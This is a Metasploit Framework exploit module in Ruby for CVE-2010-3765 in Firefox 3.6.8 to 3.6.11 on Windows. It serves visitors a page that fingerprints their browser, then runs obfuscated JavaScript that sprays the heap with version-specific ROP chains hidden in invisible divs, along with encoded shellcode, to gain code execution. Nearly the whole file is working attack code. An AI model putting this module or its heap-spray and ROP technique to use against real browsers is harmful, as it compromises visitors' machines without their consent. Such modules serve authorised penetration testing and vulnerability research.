##
# $Id: mozilla_interleaved_write.rb 11796 2011-02-22 20:49:44Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	#
	# This module acts as an HTTP server
	#
	include Msf::Exploit::Remote::HttpServer::HTML

	include Msf::Exploit::Remote::BrowserAutopwn
	autopwn_info({
		:ua_name => HttpClients::FF,
		:ua_minver => "3.6.8",
		:ua_maxver => "3.6.11",
		:os_name => OperatingSystems::WINDOWS,
		:javascript => true,
		:rank => NormalRanking,
		:vuln_test => "if (typeof InstallVersion != 'undefined') { is_vuln = true; }",
	})

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Mozilla Firefox Interleaving document.write and appendChild Exploit',
			'Description'    => %q{
					This module exploits a code execution vulnerability in Mozilla
				Firefox caused by interleaved calls to document.write and appendChild.
				This exploit is a metasploit port of the in-the-wild exploit.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'unknown',        # discovered in the wild
					'scriptjunkie'    # Metasploit module, functionality/portability fixes
				],
			'Version'        => '$Revision: 11796 $',
			'References'     =>
				[
					['CVE',    '2010-3765'],
					['OSVDB',  '68905'],
					['BID',    '15352'],
					['URL',    'http://www.exploit-db.com/exploits/15352/'],
					['URL',    'https://bugzilla.mozilla.org/show_bug.cgi?id=607222'],
					['URL',    'http://www.mozilla.org/security/announce/2010/mfsa2010-73.html']
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "",
				},
			'Targets'        =>
				[
					# Tested against Firefox 3.6.8, 3.6.9, 3.6.10, and 3.6.11 on WinXP and Windows Server 2003
					[ 'Firefox 3.6.8 - 3.6.11, Windows XP/Windows Server 2003',
						{
							'Platform' => 'win',
							'Arch' => ARCH_X86,
						}
					],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Oct 25 2010'
			))
	end

	def on_request_uri(cli, request)

		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")
		send_response_html(cli, generate_html(p), { 'Content-Type' => 'text/html' })

		# Handle the payload
		handler(cli)
	end

	def generate_html(payload)
		enc_code = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		custom_js = %Q|
function check(){
	var temp="";
	var user=navigator.userAgent.toLowerCase();
	var vara=user.indexOf("windows nt 6.1");
	var varb=user.indexOf("windows nt 6.0");
	var varc=user.indexOf("firefox/3.6.8");
	var vard=user.indexOf("firefox/3.6.9");
	var vare=user.indexOf("firefox/3.6.10");
	var varf=user.indexOf("firefox/3.6.11");
	if(vara==-1&&varb==-1&&varc!=-1&&vard==-1&&vare==-1&&varf==-1){
		temp="8";
	}
	else if(vara==-1&&varb==-1&&varc==-1&&vard!=-1&&vare==-1&&varf==-1){
		temp="9";
	}
	else if(vara==-1&&varb==-1&&varc==-1&&vard==-1&&vare!=-1&&varf==-1){
		temp="10";
	}
	else if(vara==-1&&varb==-1&&varc==-1&&vard==-1&&vare==-1&&varf!=-1){
		temp="11";
	}
	else {
		return temp="0";
	}
	return temp;

}
function dedede(argsu){
	var i;var sunb = "";
	for (i = 0; i < argsu.length; i++){
		sunb += String.fromCharCode(parseInt(argsu[i], 16));
		}
	return unescape(sunb);
}
function code(beastk){
	var nop = "";
	var len = beastk.length;
	for (i = 0; i < len;) {
		nop = nop + "m" + beastk.substring(i, i + 5);
		i = i + 5;
	}
	nop = nop.split("m").toString();
	var temp = new Array();
	for (j = 0; j < nop.length; j++) {
		if (nop.charCodeAt(j).toString(16) == "2c") {
			temp.push("25");
		}
		else {
			temp.push(nop.charCodeAt(j).toString(16));
		}
	}
	return dedede(temp);
}
function getatts(str){
	var cobj=document.createElement(str);
	cobj.id="testcase";
	document.body.appendChild(cobj);
	var obj=document.getElementById("testcase");
	var atts = new Array();
	for(p in obj){
		if(typeof(obj[p])=="string"){
			atts.push(p);
		}
	}
	document.body.removeChild(cobj);
	return atts;
}
var chk=check();
var bk="mp.ojsyex5";
var array = new Array();
var ls = 0x100000-(bk.length*2+0x01020);
var retaddr ="";//////////////////////111111111111111111111111111111
if (chk == "0") {
	location.href = "about:blank";
}
else {

		if(chk=="8"){
			retaddr=code("u0d0du0d0d");
			}
		if(chk=="9"){
			retaddr=code("uef52u100a");
			}
		if(chk=="10"){
			retaddr=code("ub8b7u1029");
			}
		if(chk=="11"){
			retaddr=code("u4bc8u1000");
		}

	var ropstr = retaddr;
	while (ropstr.length < (0x85750 - 0x1000) / 2) {
		ropstr += retaddr
	};

	///////////////////////////////2222222222222222222
	var sunb="";
	var sun8inner = document.getElementById("sun8").innerHTML;
	var sun9inner = document.getElementById("sun9").innerHTML;
	var sun10inner = document.getElementById("sun10").innerHTML;
	var sun11inner = document.getElementById("sun11").innerHTML;
	var shellcodes = document.getElementById("suv").innerHTML;
	if(chk=="8"){
			sunb=sun8inner;
			}
	if(chk=="9"){
			sunb=sun9inner;
			}
	if(chk=="10"){
			sunb=sun10inner;
			}
	if(chk=="11"){
			sunb=sun11inner;
			}
	ropstr += code(sunb + shellcodes);
	for (u = 0; u < 8; u++) {
		retaddr += retaddr;
	}
	while (ropstr.length < ls) {
		ropstr += retaddr;
	}
	var lefthalf = ropstr.substring(0, ls / 2);
	ropstr = "";
	for (i = 0; i < 0x200; i++) {
		array[i] = lefthalf + bk;
	}
	////////////////////////////////////333333333333
	if(chk=="8"){
		retaddr=code("ub8a7u1029");
	}
	if(chk=="9"){
		retaddr=code("uab07u1006");
	}
	if(chk=="10"){
		retaddr=code("u8247u1009");
	}
	if(chk=="11"){
		retaddr=code("uf7e7u1017");
	}
	for (i = 0; i < 16; i++) {
		retaddr += retaddr;
	}
	ropstr = retaddr;
	while (ropstr.length < ls) {
		ropstr += retaddr;
	}
	lefthalf = ropstr.substring(0, ls / 2);
	ropstr = "";
	for (i = 0x200; i < 0x500; i++) {
		array[i] = lefthalf + bk;
	}

	var tags = new Array("audio", "a", "base");
	for (inx = 0; inx < 0x8964; inx++)
		for (i = 0; i < tags.length; i++) {
			var atts = getatts(tags[i]);
			for (j = 0; j < atts.length; j++) {
				var html = "<" + tags[i] + " " + atts[j] + "=a></" + tags[i] + ">" + tags[i];
				document.write(html);
			}
		}
}
		|
			opts = {
				'Symbols' => {
					'Variables' => %w{ atts temp vara varb varc vard vare varf argsu beastk nop tags retaddr
						ropstr lefthalf bk sunb shellcodes sun8inner sun9inner sun10inner sun11inner array chk },
					'Methods'   => %w{ getatts code check dedede }
				}
			}
			custom_js = ::Rex::Exploitation::ObfuscateJS.new(custom_js, opts).obfuscate()
		return %Q|
<html>
<body>
<div style="visibility:hidden;width:0px;height:0px">
<div id=sun8>ub8acu1029u0d00u0d0du0d00u102du1000u0d00u102du1000u8710u1018ub288u1086u127cu1004udc24u1009u102du1000u0000u0000u1000u0000u1000u0000u0040u0000u1af1u1000u9090u0febu7be4u1005u2a49u1000u2a49u1000u2a49u1000u2a49u1000u1af1u1000u5b58u1889u7be4u1005u2a49u1000u2a49u1000u2a49u1000u2a49u1000u1af1u1000ufb83u74ffu7be4u1005u2a49u1000u2a49u1000u2a49u1000u2a49u1000u1af1u1000u830bu04c0u7be4u1005u2a49u1000u2a49u1000u2a49u1000u2a49u1000u1af1u1000uf3ebue890u7be4u1005u2a49u1000u2a49u1000u2a49u1000u2a49u1000u1af1u1000uffecuffffu7be4u1005u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004u1734u1004udc24u1009</div>
<div id=sun9>u2794u1000uc288u1082u3e38u1000u6cd4u100bu1016u1000u0000u0000u1000u0000u1000u0000u0040u0000uce22u1003u9090u0FEBu9602u1001uc563u1000uc563u1000uc563u1000uc563u1000uce22u1003u5B58u1889u9602u1001uc563u1000uc563u1000uc563u1000uc563u1000uce22u1003uFB83u74FFu9602u1001uc563u1000uc563u1000uc563u1000uc563u1000uce22u1003u830Bu04C0u9602u1001uc563u1000uc563u1000uc563u1000uc563u1000uce22u1003uF3EBuE890u9602u1001uc563u1000uc563u1000uc563u1000uc563u1000uce22u1003uFFECuFFFFu9602u1001u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u4c0eu1006u6cd4u100b</div>
<div id=sun10>uB8B7u1029uB8B7u1029uB8B7u1029uB8B7u1029uB8B7u1029uB8B7u1029u20F0u1011u2288u1082u428au1000u7676u1016ub8b7u1029u0000u0000u1000u0000u1000u0000u0040u0000u9405u1003u9090u0FEBuE541u1001u0583u1001u0583u1001u0583u1001u0583u1001u9405u1003u5B58u1889uE541u1001u0583u1001u0583u1001u0583u1001u0583u1001u9405u1003uFB83u74FFuE541u1001u0583u1001u0583u1001u0583u1001u0583u1001u9405u1003u830Bu04C0uE541u1001u0583u1001u0583u1001u0583u1001u0583u1001u9405u1003uF3EBuE890uE541u1001u0583u1001u0583u1001u0583u1001u0583u1001u9405u1003uFFECuFFFFuE541u1001u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u65a0u1006u7676u1016</div>
<div id=sun11>u4bc8u1000u4bc8u1000u4bc8u1000u4bc8u1000u4bc8u1000u4bc8u1000u83cau1000u0280u1083u3b5au1000u8ef4u100au4bc8u1000u0000u0000u1000u0000u1000u0000u0040u0000u11a1u1000u9090u0FEBu3500u1007u25dfu1000u25dfu1000u25dfu1000u25dfu1000u11a1u1000u5B58u1889u3500u1007u25dfu1000u25dfu1000u25dfu1000u25dfu1000u11a1u1000uFB83u74FFu3500u1007u25dfu1000u25dfu1000u25dfu1000u25dfu1000u11a1u1000u830Bu04C0u3500u1007u25dfu1000u25dfu1000u25dfu1000u25dfu1000u11a1u1000uF3EBuE890u3500u1007u25dfu1000u25dfu1000u25dfu1000u25dfu1000u11a1u1000uFFECuFFFFu3500u1007u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u647eu1006u8ef4u100a</div>
<div id=suv>#{enc_code.split("%").join}uffffuffffuffffuffff</div>
</div>
<body>
<script type="text/javascript">
#{custom_js}
</script></body></html>
		|

	end

end

